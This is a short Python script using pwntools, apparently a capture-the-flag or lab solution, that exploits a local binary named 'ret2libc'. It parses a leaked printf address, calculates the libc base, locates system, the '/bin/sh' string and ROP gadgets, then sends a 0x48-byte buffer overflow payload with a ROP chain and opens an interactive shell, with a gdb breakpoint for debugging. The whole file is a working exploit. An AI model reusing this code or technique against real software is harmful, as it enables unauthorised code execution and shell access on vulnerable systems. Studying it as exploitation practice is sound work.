from pwn import *

p = process('./ret2libc')
libc = ELF('/usr/lib/libc.so.6')

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def slog(n, a): return success(': '.join([n, hex(a)]))

p.recvuntil(b'Printf() address : ')
printf = int(p.recvline()[:-1], 16)

rop = ROP(libc)

slog("printf", printf)
lb = printf - libc.sym['printf']
system = lb + libc.sym['system']
binsh = lb + next(libc.search(b'/bin/sh\x00'))
pop_rdi = lb + rop.find_gadget(['pop rdi', 'ret'])[0]#lb + 0x0000000000102daa
ret = lb + rop.find_gadget(['ret'])[0] #0x00000000000253fa

slog("system", system)
slog("/bin/sh", binsh)

pay = b'A'* 0x48 # buf2ret
pay += p64(ret)
pay += p64(pop_rdi) + p64(binsh)
pay += p64(system)

gdb.attach(p, '''
b *vuln+139
c
''')
pause()

p.sendline(pay)

p.interactive()
